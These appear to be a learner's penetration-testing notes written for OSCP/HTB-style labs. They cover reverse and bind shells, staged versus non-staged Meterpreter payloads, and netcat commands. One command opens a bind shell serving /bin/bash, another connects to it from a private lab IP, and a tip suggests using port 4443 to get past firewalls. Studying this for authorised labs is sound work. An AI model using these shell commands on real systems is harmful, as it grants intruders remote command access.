#Shell and payload types
#Exploitation
#What to do when there is nothing to exploit.

#Shell
#Reverse Shell:
#Using Netcat reverse shell-it is a port listener or port connector
#you have an attackbox snd set up a listener on port 4444
#there will be a target machine

#Bind Shell
#Victim will get connected to the attacker
#A malicious port will be opened up on the target machine and connect to it directly.
#It is easier to use as compared to reverse shell.

#Staged Vs Non-Staged Payloads

#Non-Staged
Sends all shellcode all at once
Larger in size and don't always work e.g windows/meterpreter_reverse_tcp

#Staged
Sends payload in stages
Can be less stable - because it sends things in stages e.g windows/meterpreter/reverse_tcp

#to run a command that listens to any port- nc means netcat
nc -lvp 4445 -e /bin/bash
#you can run the next command as bind connection to see if iit will connect to the port (4445) as an attacker
nc 192.168.202.129 4445
#run whoami- it could say root
#run pwd - it could say /root
#hostname- kali
#command to run for just listening- nc -lvp 4445 (netcat lvp port)
# 4445 is used a lot for listening
# 4444 is used by metasploit
#to bypass some firewalls, you can use port 4443
#you will be using all the above netcat commands alot when you want how to spin up a listener e.g OSCP, HTB, etc
